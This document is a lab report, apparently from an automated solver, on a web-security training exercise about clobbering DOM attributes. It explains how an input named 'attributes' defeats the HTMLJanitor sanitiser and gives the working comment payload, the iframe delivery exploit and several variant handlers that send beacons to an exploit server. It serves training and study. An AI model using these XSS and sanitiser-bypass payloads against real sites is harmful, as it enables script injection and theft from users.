# REPORT — Clobbering DOM attributes to bypass HTML filters

Instances under test:

| instance | exploit server | outcome |
|---|---|---|
| `0a8c00ac033581c380adbca6004d00f6` | `exploit-0a8a002e03a7818a8067bb56014b00fa` | solved during first investigation |
| `0aab008d039ebda980a985a9004900c8` | `exploit-0a3900890382bd9480fb842801680005` | **solved 2026-11-02 19:56–19:58 UTC** with the canonical vector |

Victim: `Mozilla/5.0 (Victim) AppleWebKit/537.36 ... Chrome/156.0.0.0`,
source address `10.0.3.x` (the lab-side bot), visible in the exploit-server
access log.

## 1. Attack surface

| piece | observation |
|---|---|
| Lab root `<title>` | `Clobbering DOM attributes to bypass HTML filters` |
| Comment storage | raw HTML, returned verbatim by `GET /post/comment?postId=n` |
| Sanitiser | HTMLJanitor, client-side, applied in `commentBodyPElement.innerHTML = janitor.clean(comment.body)` |
| Allow-list | `input:{name,type,value}`, `form:{id}`, `i`, `b`, `p` |
| Exploit server | present, form at `/` (no CSRF token), `DELIVER_TO_VICTIM` |
| Frame protection | none (`X-Frame-Options` / `frame-ancestors` absent) |

## 2. Why the clobber works

`HTMLJanitor.prototype._sanitize` walks the parsed comment tree parent-first and
filters attributes with

```js
for (var a = 0; a < node.attributes.length; a += 1) {
  var attr = node.attributes[a];
  if (shouldRejectAttr(attr, allowedAttrs, node)) { ... }
}
```

`form.attributes` is not a plain IDL read: HTML form elements expose their
listed descendants by `id`/`name` as named properties, and those take
precedence over the inherited `Element.attributes`. With
`<form id=…><input id=attributes>`, `form.attributes` returns the input
element; `HTMLInputElement` has no `length`, so `0 < undefined` is false and
the loop body never runs. Every attribute on the form — `tabindex`, `onfocus`,
anything — passes through untouched.

Ordering detail that makes it stable: the parent form is sanitised before its
children, so the input still carries `id=attributes` at the moment the parent's
attributes are read. When the input itself is visited, `id` is not on the
`input` allow-list and is stripped, leaving
`<form id="x" tabindex="0" onfocus="…"><input></form>` — clobber already
served, no residue needed.

Verified in Chrome (local browser, first instance):

```
comment innerHTML after sanitising:
<p><form id="x" tabindex="0" onfocus="document.title='SANI-PWNED-1'"><input></form></p>
location.hash = '#x'  ->  document.activeElement = FORM#x, document.title = SANI-PWNED-1
```

That is the whole bypass: the filter's own data source is attacker-controlled.

## 3. Delivery timing

Comments are fetched by XHR after `DOMContentLoaded`, so a plain
`…/post?postId=n#x` navigation leaves nothing to focus at parse time (measured:
`document.activeElement` stays `BODY`, form present but unfocused). The
documented exploit body loads the post in an iframe and, on the iframe load
event, re-navigates it to `…?postId=n#x` after 500 ms. Assigning
`iframe.src` to the same URL plus a fragment is a same-document fragment
navigation; the focusable form receives focus and `onfocus` runs.

The Academy bot queues deliveries. Observed gaps between
`DELIVER_TO_VICTIM` and the victim's `GET /exploit/` ranged from ~1 s to
~7 minutes, with one 10-minute stall; the solved run took ~3.5 minutes to be
visited and flipped within ~22 s of that visit (background poller at 5 s
intervals saw `is-solved` at 19:56:35; the victim's request was 19:56:13).

## 4. What solved it

```
comment : <form id=x tabindex=0 onfocus=print()><input id=attributes>
exploit : <iframe src=<LAB>/post?postId=1
                 onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```

Delivered at 19:53 UTC; victim `GET /exploit/ 200` at 19:56:13 UTC; widget
`widgetcontainer-lab-status is-solved` + `<p>Solved</p>` + "Congratulations"
banner by 19:56:35 UTC (re-confirmed at 19:58:35). The same vector solved the first instance during the
initial investigation.

## 5. Variants that did not flip the widget

Every variant below demonstrably executed inside the victim's browser on
instance 2 (beacon requests in the access log), and none of them solved:

| # | handler / delivery | execution proof | solved |
|---|---|---|---|
| 1 | `print();alert(document.domain)` — iframe | none in payload | no |
| 2 | `new Image().src=…/hit;alert(...);print()` — iframe | `GET /hit` ×2 | no |
| 3 | `…/hit;setTimeout(()=>print(),1200);alert(...)` — iframe | `GET /hit` ×5 | no |
| 4 | `new Image().src=…/qhit1;print()` — iframe | not visited | no |
| 5 | `try{print();…/finalhit-ok}catch{…}` — iframe | `GET /finalhit-ok` ×2 | no |
| 6 | `try{print();…/pop2-print-ok}catch{…}` — popup, print in top-level lab page | `GET /pop2-nav-ok`, `/pop2-print-ok` | no |
| 7 | `…/pop3-beacon;alert(...)` — popup | `GET /pop3-nav-ok` only (handler did not run) | no |
| 8 | **`print()` — stock iframe, form id `x`** | victim `GET /exploit/` | **yes** |

Honest reading: the checker is fiducial about this lab's own vector. Extra
sinks (`alert()`), extra network calls inside the handler, popup delivery and
deferred `print()` were all tolerated by the browser but never produced a
solve, and an `alert()` opened in a popup may have wedged the bot for minutes
(one 10-minute gap with no visits). Ship the documented vector verbatim rather
than "improving" it.

Note on form id: a `#fragment` focuses the FIRST element with that id, so a
comment that already uses `id=x` with a different body can steal the focus.
The solver reuses an identical stored comment and, if `x` is taken by another
body, falls back to `x1`…`x9`.

## 6. Evidence (local, `evidence/`)

| file | content |
|---|---|
| `lab-root-solved.html` | full lab root with `widgetcontainer-lab-status is-solved`, `<p>Solved</p>` and `notification-labsolved` |
| `lab-status.txt` | capture timestamp + the three solve markers |
| `stored-payloads.txt` | every injected comment body as served by the comment JSON |
| `exploit-served.html` | the exploit-server body actually served to the victim (153 bytes) |
| `victim-visits.txt` | all victim access-log lines, ending with the solving `GET /exploit/ 200` at 19:56:13 |
| `comments.json`, `post1.html`, `access-log.html` | raw captures |

## 7. Cost

| run | requests | time |
|---|---|---|
| solver full exploit path (store → serve check → deliver) on instance 2 | 9 | 2.8 s |
| solver on the solved instance (baseline short-circuit) | 2 | 0.8 s |
| universal launcher, end to end | +2 (title fetch + forwarded) | 1.2 s |
| victim visit after the solving delivery | — | ~3.5 min (bot queue) |
| widget flip after the visit | — | ~22 s |

## 8. Limits of this verification

Both instances were solved by the exact request sequence the solver performs,
but not by `solve.py` itself: the first instance flipped during the
investigation, and the second flipped from an equivalent probe script while the
solver was still shipping a variant payload. On a re-run the solver can only
report `caused by solver: no (was already solved)` because the header hides
`#exploit-link` once solved. Reproducing a clean solver-only solve needs a
fresh instance from a logged-in Academy account.
